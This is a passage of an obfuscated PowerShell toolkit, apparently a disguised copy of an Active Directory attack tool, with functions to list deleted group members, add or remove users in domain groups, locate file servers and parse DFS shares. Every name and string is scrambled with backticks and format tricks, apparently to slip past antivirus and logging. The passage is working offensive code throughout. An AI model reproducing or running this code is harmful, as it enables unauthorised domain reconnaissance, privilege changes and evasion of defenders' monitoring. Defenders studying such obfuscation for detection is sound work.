        if (${P`sBounDPar`AMete`RS}[("{0}{2}{1}"-f'LDAPFilt','r','e')]) { ${se`A`R`cHErARGumEn`TS}[("{2}{0}{1}"-f 'l','ter','LDAPFi')] = ${LdA`PFI`lT`er} }
        if (${psB`o`UnDPA`RA`Met`eRs}[("{0}{1}{2}" -f 'Se','archBa','se')]) { ${SEAR`ChE`RARGuME`N`Ts}[("{1}{0}{2}"-f's','SearchBa','e')] = ${Sea`R`c`hBaSe} }
        if (${PsBOu`NDPA`RaM`eTErS}[("{2}{0}{1}" -f 'e','rver','S')]) { ${SeA`RchER`AR`GuMEnTs}[("{2}{0}{1}" -f 'v','er','Ser')] = ${Ser`VEr} }
        if (${pS`BoUnd`Pa`RaMET`E`RS}[("{1}{0}{2}"-f'ch','Sear','Scope')]) { ${s`EArCH`e`RARGUMENTS}[("{1}{2}{3}{0}" -f'e','Sear','ch','Scop')] = ${S`eAr`cH`scOPe} }
        if (${psbo`UNd`p`Ar`Ame`TErs}[("{0}{1}{3}{4}{2}" -f'R','esultPa','ze','geS','i')]) { ${se`A`RCHe`RarGUMENTs}[("{4}{2}{3}{0}{1}"-f'g','eSize','s','ultPa','Re')] = ${res`ULtp`AGEsiZe} }
        if (${P`SBoUN`dpa`RAMEte`RS}[("{2}{1}{3}{0}" -f 'mit','rverTim','Se','eLi')]) { ${Se`ARcheRaRg`Um`Ents}[("{2}{0}{1}"-f 'erT','imeLimit','Serv')] = ${Se`RV`ertiM`ELiMIt} }
        if (${p`SBOUndp`AR`AMET`ErS}[("{0}{1}{2}"-f 'To','mbst','one')]) { ${seAr`C`hErAr`g`UMEnts}[("{1}{0}{3}{2}"-f'mb','To','tone','s')] = ${T`omB`stONE} }
        if (${P`SbO`U`NdpaRA`mEt`ErS}[("{1}{2}{3}{0}" -f'dential','C','r','e')]) { ${SE`ArCH`era`R`gU`meNts}[("{1}{2}{0}" -f'ial','Cr','edent')] = ${c`R`edenTiAL} }
    }

    PROCESS {
        if (${P`Sbo`UNDParAmETe`Rs}[("{0}{2}{1}"-f'I','y','dentit')]) { ${SeA`Rch`ERA`RgUmE`Nts}[("{2}{0}{1}"-f 'nt','ity','Ide')] = ${ID`e`N`TiTY} }

        &("{2}{0}{3}{1}{4}" -f 'e','-Domain','G','t','Object') @SearcherArguments | &("{2}{0}{1}" -f 'jec','t','ForEach-Ob') {
            ${o`Bject`Dn} = ${_}."pro`pER`TIeS"[("{2}{1}{0}{3}{4}"-f'na','d','distinguishe','m','e')][0]
            ForEach(${Xm`ln`oDe} in ${_}."prO`per`TI`eS"[("{1}{4}{3}{5}{0}{2}"-f'etada','m','ta','eplvalu','sds-r','em')]) {
                ${Te`M`PObject} = [xml]${xmln`o`dE} | &("{1}{3}{0}{2}" -f'ct','Se','-Object','le') -ExpandProperty ("{1}{5}{4}{3}{0}{2}" -f '_DA','DS_REP','TA','A','MET','L_VALUE_') -ErrorAction ("{1}{0}{3}{2}"-f'yC','Silentl','nue','onti')
                if (${tEMp`Ob`je`Ct}) {
                    if ((${TemPo`B`J`EcT}."pszATtRI`B`UtE`N`AMe" -Match ("{1}{0}"-f'r','membe')) -and ((${T`empOB`j`ecT}."dw`VErs`ION" % 2) -eq 0 )) {
                        ${OuTp`UT} = &("{0}{3}{1}{2}"-f'Ne','j','ect','w-Ob') ("{1}{0}{2}" -f 'Obj','PS','ect')
                        ${oUtp`Ut} | &("{0}{2}{1}{3}"-f'A','Me','dd-','mber') ("{0}{1}{2}"-f 'N','oteProper','ty') ("{2}{1}{0}"-f 'DN','oup','Gr') ${ObJeCT`Dn}
                        ${o`UTpUt} | &("{0}{1}{2}" -f'Add-M','e','mber') ("{1}{3}{0}{2}"-f 'ePro','N','perty','ot') ("{2}{0}{1}"-f'erD','N','Memb') ${teMpOBj`e`CT}."PsZOb`Je`Ctdn"
                        ${OUtp`Ut} | &("{0}{1}{2}" -f'Add-Memb','e','r') ("{2}{1}{3}{0}"-f 'ty','otePr','N','oper') ("{0}{1}{2}" -f 'TimeFir','st','Added') ${tEM`po`BjECT}."f`TI`M`eCReateD"
                        ${ouTp`Ut} | &("{2}{1}{3}{0}"-f'r','Memb','Add-','e') ("{1}{2}{3}{0}"-f'erty','Note','P','rop') ("{1}{2}{0}" -f'd','TimeDele','te') ${T`EmPObJ`eCT}."ftimED`eL`eT`eD"
                        ${o`UT`PUT} | &("{2}{1}{0}"-f 'r','be','Add-Mem') ("{1}{0}{2}"-f'teProp','No','erty') ("{2}{0}{3}{1}"-f 'ig','e','LastOr','inatingChang') ${TEmPo`BjE`ct}."FtIM`eLAs`ToR`IG`InAT`In`gchAnGe"
                        ${oUtP`Ut} | &("{0}{2}{1}" -f 'Add','er','-Memb') ("{0}{3}{2}{1}"-f 'N','Property','te','o') ("{1}{3}{0}{2}"-f 'Adde','T','d','imes') (${t`EMPo`B`jecT}."d`Wver`S`ioN" / 2)
                        ${OU`Tp`Ut} | &("{0}{1}{2}"-f 'Add-Memb','e','r') ("{1}{3}{2}{0}" -f 'ty','N','er','oteProp') ("{4}{1}{0}{5}{2}{3}"-f 'inatin','astOrig','Dsa','DN','L','g') ${t`em`P`obJeCT}."P`sZLAsT`oRig`IN`ATIng`DsA`dn"
                        ${OUt`pUt}."pS`ObJ`ECT"."Ty`P`enAMes".("{1}{0}"-f'nsert','I').Invoke(0, ("{1}{5}{3}{0}{4}{8}{2}{6}{7}"-f '.Dom','Powe','M','View','ain','r','emberDel','eted','Group'))
                        ${Ou`TPUt}
                    }
                }
                else {
                    &("{1}{0}{2}" -f 'r','Write-Ve','bose') ('[G'+'e'+'t-'+'Domain'+'Gro'+'u'+'pMemberD'+'eleted] '+'E'+'r'+'ror '+'ret'+'rievi'+'n'+'g '+('i'+'PCmsd'+'s-re'+'p'+'lv'+'alu'+'emetadat'+'aiPC ')."re`Pla`cE"('iPC',[STRInG][CHAR]39)+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function AdD-d`OmA`InGro`U`pm`EM`BEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}" -f 'hou','ldProc','PSS','ess'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItION = 0, maNDatORY = ${T`RuE})]
        [Alias({"{2}{0}{1}{3}"-f 'a','m','GroupN','e'}, {"{1}{0}{2}"-f 'ou','Gr','pIdentity'})]
        [String]
        ${Iden`Tity},

        [Parameter(mANDAToRY = ${tr`UE}, vAlUefRoMPiPElInE = ${tR`UE}, ValuEfrOmPipelInebYPrOPertyNaMe = ${T`Rue})]
        [Alias({"{0}{2}{1}" -f'M','ity','emberIdent'}, {"{1}{0}" -f 'er','Memb'}, {"{2}{0}{3}{5}{4}{1}"-f 's','e','Di','tinguished','m','Na'})]
        [String[]]
        ${MeM`Be`RS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`OmA`IN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`E`D`enTiAL} =  (GCI  ("vA"+"R"+"IAB"+"lE:7t"+"Q02") )."V`Alue"::"e`Mpty"
    )

    BEGIN {
        ${cONtext`A`RGU`mEN`TS} = @{
            ("{1}{0}"-f'y','Identit') = ${Ide`NTiTy}
        }
        if (${PSboUnDpAR`Amet`E`RS}[("{1}{0}" -f'n','Domai')]) { ${CoNTeXTar`G`U`me`NTS}[("{0}{1}" -f 'Doma','in')] = ${d`OMa`In} }
        if (${PSb`O`Und`p`AramEt`ErS}[("{3}{0}{1}{2}" -f 'rede','nti','al','C')]) { ${C`o`NTeX`TA`RGu`Ments}[("{0}{1}{2}"-f 'Crede','n','tial')] = ${cReD`e`N`TiAl} }

        ${GrO`UPcO`NT`EXt} = &("{4}{2}{0}{1}{3}" -f'lC','onte','pa','xt','Get-Princi') @ContextArguments

        if (${Gr`oup`coN`Text}) {
            try {
                ${gro`Up} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{3}{1}{0}{2}{4}" -f 'ndByIde','i','n','F','tity').Invoke(${gROuPcoN`TE`XT}."c`ONt`ext", ${GrO`U`PcoNt`Ext}."iDe`NTi`TY")
            }
            catch {
                &("{0}{1}{2}{3}"-f 'Writ','e','-Warnin','g') ('[Add-Domai'+'nGrou'+'pM'+'emb'+'er] '+'Error'+' '+'f'+'inding '+'t'+'he '+'grou'+'p '+'ide'+'ntity '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${G`Roup}) {
            ForEach (${M`emb`eR} in ${MEMb`E`RS}) {
                if (${m`e`mBER} -match ((("{0}{2}{1}" -f '.','uz4u.+','+z4'))  -CRePlaCE ([ChAR]122+[ChAR]52+[ChAR]117),[ChAR]92)) {
                    ${c`oNteXTaRG`U`MeNTS}[("{1}{0}{2}"-f 'de','I','ntity')] = (${MEMb`ER} -split '\\')[1]
                    ${CON`Text`ARgUME`NTs}[("{2}{0}{1}"-f 'mai','n','Do')] = (${m`emBER} -split '\\')[0]
                    ${US`eR`contE`Xt} = &("{3}{4}{0}{1}{2}{5}"-f'cip','alCon','te','Get-','Prin','xt') @ContextArguments
                    if (${USErc`OntE`Xt}) {
                        ${usEr`Id`eNtiTy} = ${U`SeRCoN`Te`XT}."IdeN`T`iTy"
                    }
                }
                else {
                    ${u`S`ERCONtExT} = ${Gro`UpcOn`TeXT}
                    ${USeRid`en`Ti`Ty} = ${M`e`mber}
                }
                &("{1}{3}{0}{2}" -f'erbos','Wri','e','te-V') ('['+'A'+'dd-Dom'+'ainGr'+'oupMember] '+'Addi'+'ng '+'me'+'mber'+' '+"'$Member' "+'t'+'o '+'gro'+'up '+"'$Identity'")
                ${mE`mB`eR} = [System.DirectoryServices.AccountManagement.Principal]::("{4}{0}{2}{1}{3}" -f'i','yIdent','ndB','ity','F').Invoke(${usEr`cONT`exT}."c`OnT`ext", ${UsE`RiDentI`TY})
                ${g`Ro`UP}."meMB`ers".("{0}{1}"-f'Ad','d').Invoke(${me`m`Ber})
                ${g`RouP}.("{0}{1}"-f 'Sav','e').Invoke()
            }
        }
    }
}


function R`EM`ove`-DOmAiN`G`RoUPME`m`BER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}" -f'c','PSS','houldPro','ess'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(POSItIOn = 0, MANDAtory = ${T`RUe})]
        [Alias({"{1}{0}{2}" -f'roupNam','G','e'}, {"{1}{0}{2}{4}{3}"-f 'u','Gro','pId','ty','enti'})]
        [String]
        ${IdEN`TIty},

        [Parameter(MaNDaToRy = ${tR`UE}, vALUeFrOmpIPELInE = ${t`RuE}, VaLUeFromPipElInEbyPRopeRTynaMe = ${T`RuE})]
        [Alias({"{1}{0}{2}"-f'mbe','Me','rIdentity'}, {"{0}{2}{1}" -f 'M','er','emb'}, {"{0}{3}{1}{2}" -f'Distin','uis','hedName','g'})]
        [String[]]
        ${m`em`BErS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OmAIN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Red`eNtIAL} =  ${7t`Q02}::"eM`pty"
    )

    BEGIN {
        ${c`On`Te`XT`ARGUmE`NtS} = @{
            ("{0}{2}{1}"-f'Id','tity','en') = ${Id`En`Tity}
        }
        if (${P`SBOun`d`P`ArameTeRs}[("{0}{1}{2}"-f'Do','m','ain')]) { ${ContExtar`g`U`m`entS}[("{0}{1}"-f 'D','omain')] = ${dO`MAIn} }
        if (${PSB`o`Un`dpa`RameteRS}[("{1}{2}{0}"-f 'al','Credent','i')]) { ${CoNT`eXT`ArgU`mEntS}[("{2}{1}{0}"-f 'ial','edent','Cr')] = ${cR`ED`eNt`iAL} }

        ${gR`oup`C`oNt`eXt} = &("{4}{3}{6}{2}{0}{1}{5}" -f'Co','nte','incipal','-P','Get','xt','r') @ContextArguments

        if (${Gro`UPCoNte`xt}) {
            try {
                ${Gr`O`UP} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::("{1}{2}{0}"-f 'dentity','Fin','dByI').Invoke(${grou`Pco`NTExt}."cOn`TE`XT", ${gR`o`Upco`NTEXt}."I`Dentity")
            }
            catch {
                &("{0}{2}{1}" -f'Wr','rning','ite-Wa') ('[R'+'emove-'+'D'+'omai'+'nGro'+'up'+'Member] '+'Erro'+'r '+'fin'+'ding'+' '+'t'+'he '+'gro'+'up '+'ident'+'i'+'ty '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if (${G`ROuP}) {
            ForEach (${M`EmB`ER} in ${mEm`BeRS}) {
                if (${m`EM`BER} -match ((("{0}{2}{1}"-f'.','ud.+','+3ud3'))."rE`PL`AcE"(([Char]51+[Char]117+[Char]100),'\'))) {
                    ${cONT`Ex`TArGum`eN`TS}[("{1}{0}"-f'tity','Iden')] = ${mEM`BER}
                    ${U`sErcOn`T`ExT} = &("{4}{3}{2}{5}{1}{0}"-f 't','ex','Principal','-','Get','Cont') @ContextArguments
                    if (${userC`ON`Text}) {
                        ${u`sERID`eNTi`Ty} = ${usErC`oNtE`xT}."I`DENt`ity"
                    }
                }
                else {
                    ${UsERc`o`NT`ExT} = ${g`R`OUpcONtE`xT}
                    ${u`sE`RI`deNtity} = ${mEM`B`er}
                }
                &("{0}{2}{1}"-f 'Write-Ve','se','rbo') ('[Re'+'m'+'o'+'ve'+'-Domai'+'n'+'Gro'+'upMembe'+'r] '+'Re'+'mo'+'ving '+'me'+'m'+'ber '+"'$Member' "+'fr'+'om '+'grou'+'p '+"'$Identity'")
                ${mEmb`er} = [System.DirectoryServices.AccountManagement.Principal]::("{2}{1}{0}{3}" -f'yI','indB','F','dentity').Invoke(${u`serc`oNt`EXT}."c`oN`Text", ${USE`RIdEn`Ti`TY})
                ${G`R`OuP}."me`m`BeRs".("{1}{0}" -f 'e','Remov').Invoke(${mE`Mb`er})
                ${gr`O`UP}.("{0}{1}" -f 'S','ave').Invoke()
            }
        }
    }
}


function Ge`T-DoM`AINf`iLESErv`ER {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}"-f'rocess','PSShou','ldP'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( VaLuEFroMPipeLInE = ${t`RUe}, vaLuEFroMpiPEliNebypROpERTynaME = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f'ame','Domain','N'}, {"{1}{0}" -f'e','Nam'})]
        [String[]]
        ${do`MA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'lter','F','i'})]
        [String]
        ${L`DAPF`iLter},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'DSPat','h','A'})]
        [String]
        ${SeArc`H`BasE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{4}{1}{2}"-f 'Do','on','troller','main','C'})]
        [String]
        ${S`E`RVER},

        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{0}"-f 'el','OneLev'}, {"{0}{1}"-f'Subtre','e'})]
        [String]
        ${SEar`chsc`OPe} = ("{2}{0}{1}"-f 'btre','e','Su'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rES`U`LtPAG`ESIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeR`VEr`TIM`el`imiT},

        [Switch]
        ${TOm`B`StoNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`dEn`TIaL} =  ( vARiabLe ('7'+'Tq02')  -Value  )::"E`mpTY"
    )

    BEGIN {
        function SPLiT-`pa`TH {
            
            Param([String]${P`ATh})

            if (${p`Ath} -and (${pA`TH}.("{0}{1}"-f'spl','it').Invoke('\\')."co`UNt" -ge 3)) {
                ${TE`mP} = ${p`AtH}.("{1}{0}"-f't','spli').Invoke('\\')[2]
                if (${TE`MP} -and (${T`EMp} -ne '')) {
                    ${t`EmP}
                }
            }
        }

        ${sEaRC`HE`RarG`UmE`NTs} = @{
            ("{0}{2}{1}" -f'L','PFilter','DA') = ((("{8}{1}{10}{18}{16}{2}{7}{17}{6}{3}{14}{0}{5}{4}{13}{11}{19}{15}{12}{21}{20}{9}" -f 'o','&(sam','306368','c','.11','untControl:1.2.840','A',')(!(u','(','=*)(profilepath=*)))','A',')(ny','m','3556.1.4.803:=2)','c','ho','Type=805','ser','ccount','z(',')(scriptpath','edirectory=*'))-CrEPLACE 'nyz',[CHar]124)
            ("{0}{2}{1}"-f 'Proper','ies','t') = ("{0}{4}{3}{5}{1}{2}" -f 'home','le','path','ipt','directory,scr','path,profi')
        }
        if (${P`s`Bo`UnD`pARAMeTE`Rs}[("{2}{1}{0}"-f 'Base','arch','Se')]) { ${SE`ARc`h`erA`RGuMe`NTS}[("{0}{2}{1}" -f 'Searc','se','hBa')] = ${SEa`R`c`hBASe} }
        if (${Ps`B`OUN`dpARaM`etERS}[("{1}{0}"-f 'ver','Ser')]) { ${Sea`R`cHeraRGumE`NTS}[("{0}{1}"-f'Serve','r')] = ${se`Rv`eR} }
        if (${P`sboUNdPAR`AmeT`Ers}[("{3}{0}{1}{2}"-f'ear','chSco','pe','S')]) { ${sEArc`herArG`UM`EntS}[("{2}{1}{0}"-f 'cope','archS','Se')] = ${s`eA`RchSco`pe} }
        if (${PSbOU`NDP`A`R`AmeteRS}[("{0}{1}{3}{2}" -f 'Res','u','e','ltPageSiz')]) { ${seaR`cHE`R`A`RG`UMeNts}[("{1}{0}{2}"-f'ltP','Resu','ageSize')] = ${r`EsUltPAGEs`I`zE} }
        if (${PSbOU`ND`P`AramE`T`Ers}[("{4}{0}{2}{3}{1}"-f 'er','t','verT','imeLimi','S')]) { ${SEaR`ch`eRAr`GUM`EntS}[("{2}{0}{1}{3}" -f'er','verTimeLimi','S','t')] = ${seRve`Rti`m`ELIMIT} }
        if (${PSBoUn`dp`A`RA`mE`TERs}[("{0}{1}{2}"-f'Tombsto','n','e')]) { ${S`eA`RC`HEraR`G`UMentS}[("{1}{0}{2}"-f 't','Tombs','one')] = ${TO`m`BsT`ONE} }
        if (${P`SBOUNdP`Ar`AMeteRs}[("{2}{0}{1}" -f 'ia','l','Credent')]) { ${seARch`e`RARGUM`EntS}[("{2}{0}{1}" -f'dentia','l','Cre')] = ${C`R`EDE`NtiAl} }
    }

    PROCESS {
        if (${PSBO`UND`PA`RA`MeTeRs}[("{1}{0}" -f 'in','Doma')]) {
            ForEach (${TaRGETD`o`main} in ${do`mA`IN}) {
                ${s`ea`Rche`RaRG`UMeN`Ts}[("{1}{0}"-f'ain','Dom')] = ${TARGEtdo`M`A`iN}
                ${u`SeRsEarc`h`eR} = &("{3}{5}{0}{4}{2}{1}"-f 'a','archer','Se','Ge','in','t-Dom') @SearcherArguments
                
                $(ForEach(${uS`ERRe`suLT} in ${USerSeA`R`CH`eR}.("{1}{0}"-f'All','Find').Invoke()) {if (${U`se`RR`eSuLT}."P`Roper`Ties"[("{2}{0}{1}"-f'irect','ory','homed')]) {&("{1}{2}{0}{3}" -f '-Pa','Spl','it','th')(${use`Rr`ESulT}."PrO`per`TIeS"[("{3}{0}{1}{2}" -f'recto','r','y','homedi')])}if (${UsERr`e`sU`Lt}."P`RoPert`i`es"[("{2}{1}{0}" -f 'th','ptpa','scri')]) {&("{2}{0}{1}"-f'lit-P','ath','Sp')(${u`S`erReSULT}."PRopE`RtI`Es"[("{2}{1}{0}"-f'th','riptpa','sc')])}if (${US`E`RRESuLt}."P`RoPeRtI`eS"[("{2}{0}{1}" -f'rof','ilepath','p')]) {&("{0}{3}{2}{1}"-f'S','th','-Pa','plit')(${u`sE`RrE`SUlT}."pro`PEr`Ties"[("{2}{1}{0}" -f'epath','l','profi')])}}) | &("{2}{1}{0}"-f 'Object','rt-','So') -Unique
            }
        }
        else {
            ${Use`RSe`A`RCh`er} = &("{3}{1}{2}{0}"-f 'her','et-DomainSea','rc','G') @SearcherArguments
            $(ForEach(${u`SerREs`ULt} in ${u`SE`Rsea`R`CHER}.("{0}{1}{2}" -f'F','indA','ll').Invoke()) {if (${us`ERRE`sUlT}."prOp`Ert`ies"[("{3}{4}{1}{0}{2}" -f'o','rect','ry','hom','edi')]) {&("{1}{0}{2}"-f 'plit','S','-Path')(${U`SErrE`suLT}."pRo`Pe`RtIeS"[("{3}{4}{0}{2}{1}"-f'dir','y','ector','h','ome')])}if (${uS`e`RrESU`lt}."pr`oPERT`iEs"[("{1}{0}{2}" -f 't','scriptpa','h')]) {&("{1}{0}{3}{2}"-f 'pl','S','Path','it-')(${Use`R`REsulT}."P`R`o`PerTiEs"[("{2}{1}{0}"-f'path','ipt','scr')])}if (${uSeR`ReS`Ult}."pr`opER`T`ies"[("{2}{0}{1}"-f 'lepat','h','profi')]) {&("{1}{0}{2}"-f 'lit-','Sp','Path')(${us`eR`REsuLT}."pr`oP`ErtIeS"[("{0}{2}{1}"-f 'prof','th','ilepa')])}}) | &("{0}{2}{1}"-f 'Sort','ct','-Obje') -Unique
        }
    }
}


function GeT-DomAI`NdfS`sH`ArE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}"-f 'PS','ouldProce','Sh','ss'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{7}{6}{8}{1}{0}{3}{5}{9}"-f 'Th','re','PSUseDec','a','l','nAssig','edVar','ar','sMo','nments'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{0}{2}{3}{4}{1}"-f'Appro','erbs','v','ed','V','PSUse'}, '')]
    [OutputType({"{3}{4}{7}{5}{2}{6}{0}{1}" -f'utomation.PSCusto','mObject','ement','System','.','nag','.A','Ma'})]
    [CmdletBinding()]
    Param(
        [Parameter( VAlueFromPiPElinE = ${T`RuE}, valuEfROMpIpElINebYprOPeRtYname = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'e','mainNam','Do'}, {"{0}{1}"-f 'Na','me'})]
        [String[]]
        ${D`o`MAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'h','ADSPat'})]
        [String]
        ${sEarC`hb`A`Se},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{4}{0}{3}{2}"-f 'n','Dom','troller','Con','ai'})]
        [String]
        ${Ser`VeR},

        [ValidateSet({"{1}{0}" -f'e','Bas'}, {"{0}{1}"-f 'OneLe','vel'}, {"{0}{1}{2}"-f'Subt','r','ee'})]
        [String]
        ${s`EArCHSC`opE} = ("{1}{0}"-f'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${Resul`TPag`E`siZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RvER`T`iMEli`mit},

        [Switch]
        ${tOm`BsTO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REdENTi`Al} =   (GEt-vArIAbLe ("{1}{0}" -f'2','7TQ0'))."VA`luE"::"eMP`TY",

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        ${v`ersIOn} = 'All'
    )

    BEGIN {
        ${se`ArCH`eRArGu`MENtS} = @{}
        if (${psBou`Ndp`Ara`mEtE`Rs}[("{0}{3}{2}{1}" -f 'S','se','rchBa','ea')]) { ${S`EArch`Er`A`RGUm`eNtS}[("{3}{2}{1}{0}" -f 'ase','hB','c','Sear')] = ${SE`ARC`hB`AsE} }
        if (${P`SBoUNdpAra`ME`TErS}[("{1}{0}"-f'er','Serv')]) { ${sE`A`RCh`ErARgUME`Nts}[("{0}{1}" -f 'Ser','ver')] = ${s`erVER} }
        if (${PsbouN`dpaR`A`m`ETE`Rs}[("{1}{0}{2}"-f 'S','Search','cope')]) { ${SeaRcHE`RArg`UM`eNtS}[("{2}{1}{0}"-f'ope','archSc','Se')] = ${S`e`ARcHsc`OpE} }
        if (${P`Sbo`U`NDPAR`AmE`TErs}[("{0}{3}{1}{2}" -f 'ResultPage','iz','e','S')]) { ${s`Ea`RCHErarGUMe`N`Ts}[("{0}{2}{1}{3}"-f'Result','Si','Page','ze')] = ${r`esUlt`PaGeS`i`ze} }
        if (${PSBOUN`d`p`ARaME`TE`RS}[("{0}{1}{4}{2}{3}"-f'Se','rv','rTi','meLimit','e')]) { ${sEaRChe`R`ARgum`eNTs}[("{1}{4}{0}{3}{2}" -f'ver','Se','imeLimit','T','r')] = ${Ser`Ve`RtimeL`Imit} }
        if (${PSboUN`DPArAME`T`ERS}[("{1}{0}{2}" -f'ombst','T','one')]) { ${se`ArcHE`RA`R`Gu`mEnts}[("{1}{0}{2}"-f 'mbs','To','tone')] = ${t`oM`BStOne} }
        if (${psb`oun`D`PAraM`E`TERS}[("{0}{1}{2}"-f 'Creden','ti','al')]) { ${sea`R`CHERa`RGU`meNts}[("{2}{0}{1}{3}"-f'r','edenti','C','al')] = ${cr`EDeN`TI`Al} }

        function PAR`sE-`pKT {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${P`kt}
            )

            ${B`IN} = ${p`kt}
            ${b`LoB`_Version} =  ( get-vaRIabLe  ("{0}{1}" -f 'D','9x8')  -va )::"T`Ou`INt32"(${b`In}[0..3],0)
            ${bl`ob`_el`eMeNT_`cOUnT} =  ${D9`X8}::"tOU`iNT`32"(${b`IN}[4..7],0)
            ${O`Ffs`eT} = 8
            
            ${oB`Jec`T_lI`St} = @()
            for(${i}=1; ${I} -le ${BLo`B_`ElE`meNT_COunt}; ${I}++){
                ${bLO`B`_`NAm`e_SizE`_`sTaRT} = ${o`F`FSeT}
                ${b`l`ob_nAmE`_`size_E`ND} = ${o`FFs`Et} + 1
                ${b`lob_`NAmE_`sI`ZE} =   ${D9`x8}::"To`UINt`16"(${b`iN}[${Bl`ob_N`Am`E_sIZ`e_`StArT}..${bL`OB_N`AM`e_sIZe_`ENd}],0)

                ${Blo`B`_NAm`e_sT`Art} = ${bLOb_namE_`SIz`e`_E`ND} + 1
                ${BlO`B_N`A`Me_E`ND} = ${blob_N`Ame`_sT`A`Rt} + ${b`l`ob_NAMe_`s`ize} - 1
                ${b`loB_N`Ame} =  (  GET-VARiAbLE ("{0}{1}"-f 'M1','lC')  -VAL)::"u`NiCoDE"."Ge`TStR`InG"(${b`IN}[${blob`_`N`Ame_St`ARt}..${b`LOB`_naME_`e`Nd}])

                ${B`L`Ob`_dATa_SiZE_STA`RT} = ${blOB_n`Ame_e`Nd} + 1
                ${B`l`o`B_Data`_SizE_`EnD} = ${BLOB_da`Ta`_`SiZe_`STaRt} + 3
                ${BL`Ob_d`Ata_SIZe} =  (Get-chilDitem ("{3}{0}{1}{2}"-f'a','Ri','abLe:d9X8','V') )."VAl`Ue"::"to`U`InT32"(${b`IN}[${b`Lob_`DaTA_s`i`Z`E_s`TARt}..${bLo`B_`datA_si`Z`E`_e`Nd}],0)

                ${blo`B_D`ATa_`StaRt} = ${blob`_`DAta_`sIZE_`end} + 1
                ${B`lOb`_dAT`A_`eNd} = ${Blo`B_`dAta`_sTaRT} + ${B`lOb_`Dat`A_s`izE} - 1
                ${Blo`B_dA`Ta} = ${B`IN}[${Blob`_d`ATA`_St`Art}..${bL`Ob_d`A`Ta_End}]
                switch -wildcard (${bLoB_`NA`Me}) {
                    ((("{0}{2}{1}"-f'D07sit','t','eroo'))  -repLAcE ([chAR]68+[chAR]48+[chAR]55),[chAR]92) {  }
                    ((("{1}{0}{2}" -f'in','5BOdoma','root*'))."r`epl`ACE"(([CHAr]53+[CHAr]66+[CHAr]79),[striNg][CHAr]92)) {
                        
                        
                        ${R`oO`T`_O`R_liNK`_gUI`D_StArt} = 0
                        ${Ro`OT_`Or_Li`N`K_Guid_e`ND} = 15
                        ${ROOT_`oR_`liN`k_GuID} = [byte[]]${BL`oB_`d`Ata}[${Roo`T_or_`LiN`K_g`UId`_`starT}..${RO`oT`_`OR_li`NK_GUId_eND}]
                        ${gU`id} = &("{0}{1}{2}" -f 'New-','Ob','ject') ("{0}{1}" -f'Gui','d')(,${rOot_`oR`_LInk_gU`ID}) 
                        ${PrEFIX`_siz`E_sT`Art} = ${rOOt_`O`R_lINk`_GUId_EnD} + 1
                        ${P`REFiX_sIZe`_E`Nd} = ${pR`ef`Ix_sIzE_s`Ta`Rt} + 1
                        ${pR`EfiX`_S`IZE} =  ${D9`X8}::"ToUiN`T16"(${bL`ob_`daTA}[${prEF`IX_siZE`_ST`Art}..${PrEFi`x`_`siZE_enD}],0)
                        ${P`REf`I`X_STa`Rt} = ${PR`E`F`ix_si`Ze_enD} + 1
                        ${PRe`F`Ix_`ENd} = ${P`REfix_`StART} + ${prefi`x_s`IZe} - 1
                        ${pre`Fix} =  (dir ('v'+'aRIABLe:m'+'1'+'Lc'))."vaL`Ue"::"un`ICODE"."Ge`TsTR`InG"(${Bl`o`B_DaTa}[${PREfi`X`_sTart}..${PREFi`x_`EnD}])

                        ${sH`orT_`pR`EFiX_`sizE_`s`Tart} = ${p`RE`FIx_E`ND} + 1
                        ${Sh`oRt_p`R`E`FIX_`size_End} = ${SHoRT_p`RE`FIX_S`i`ZE`_S`TARt} + 1
                        ${SH`oRt_`pr`EfiX_s`iZe} =  ( variAbLE  ("{1}{0}"-f'8','d9x') )."V`ALue"::"to`Ui`NT16"(${BloB`_DA`TA}[${sH`Ort_prEFi`X`_`s`iZe_st`ArT}..${Sh`oR`T_p`ReFi`x_S`Ize_end}],0)
                        ${shOrT_prE`FI`x_StA`RT} = ${SH`ORT_prefiX_`siz`E_ENd} + 1
                        ${SHoR`T`_PrEf`Ix_eND} = ${sH`Ort_Pr`eF`i`x_ST`ArT} + ${shorT_pR`efi`X`_S`I`zE} - 1
